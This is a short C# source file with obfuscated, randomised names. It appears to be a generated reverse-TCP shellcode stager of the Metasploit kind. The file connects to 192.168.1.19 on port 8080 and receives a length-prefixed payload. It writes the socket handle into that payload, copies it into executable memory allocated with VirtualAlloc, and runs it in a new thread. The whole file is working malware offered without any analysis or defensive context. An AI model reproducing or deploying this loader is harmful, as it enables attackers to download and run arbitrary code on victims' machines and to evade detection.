using System; using System.Net; using System.Net.Sockets; using System.Runtime.InteropServices; using System.Threading;
namespace shjeYDPG { class QliyevFUQJ {
static byte[] uTwMYEcIKxB(string pdAkdniaNAhUn, int JDpJZtU) {
    IPEndPoint jMzsVvEIgYIfkx = new IPEndPoint(IPAddress.Parse(pdAkdniaNAhUn), JDpJZtU);
    Socket vOFZDW = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
    try { vOFZDW.Connect(jMzsVvEIgYIfkx); }
    catch { return null;}
    byte[] QKAKDqysQnE = new byte[4];
    vOFZDW.Receive(QKAKDqysQnE, 4, 0);
    int rPsRLNUbm = BitConverter.ToInt32(QKAKDqysQnE, 0);
    byte[] kiKbeAmRcfUK = new byte[rPsRLNUbm + 5];
    int jbacejRyJb = 0;
    while (jbacejRyJb < rPsRLNUbm)
    { jbacejRyJb += vOFZDW.Receive(kiKbeAmRcfUK, jbacejRyJb + 5, (rPsRLNUbm - jbacejRyJb) < 4096 ? (rPsRLNUbm - jbacejRyJb) : 4096, 0);}
    byte[] KbLuEoEFbKQcTO = BitConverter.GetBytes((int)vOFZDW.Handle);
    Array.Copy(KbLuEoEFbKQcTO, 0, kiKbeAmRcfUK, 1, 4); kiKbeAmRcfUK[0] = 0xBF;
    return kiKbeAmRcfUK;}
static void OfyAbBtvTU(byte[] RtOSfr) {
    if (RtOSfr != null) {
        UInt32 CfExkhMrAL = VirtualAlloc(0, (UInt32)RtOSfr.Length, 0x1000, 0x40);
        Marshal.Copy(RtOSfr, 0, (IntPtr)(CfExkhMrAL), RtOSfr.Length);
        IntPtr vOvobUC = IntPtr.Zero;
        UInt32 KwCCHM = 0;
        IntPtr VYBSnSt = IntPtr.Zero;
        vOvobUC = CreateThread(0, 0, CfExkhMrAL, VYBSnSt, 0, ref KwCCHM);
        WaitForSingleObject(vOvobUC, 0xFFFFFFFF); }}
static void Main(){
    byte[] PBEdeHEEs = null; PBEdeHEEs = uTwMYEcIKxB("192.168.1.19", 8080);
    OfyAbBtvTU(PBEdeHEEs); }
		[DllImport("kernel32")] private static extern UInt32 VirtualAlloc(UInt32 hsVsvgnhIy,UInt32 HnvqCho, UInt32 NosKzN, UInt32 yswgXNDQdmY);
[DllImport("kernel32")]private static extern IntPtr CreateThread(UInt32 tFjbcWob, UInt32 EkAjcdtWmuK, UInt32 UWdDpprN,IntPtr nmJkEVa, UInt32 qSVxta, ref UInt32 PVchJFanz);
[DllImport("kernel32")] private static extern UInt32 WaitForSingleObject(IntPtr cDeSWrzu, UInt32 eZBQwvRj);}}
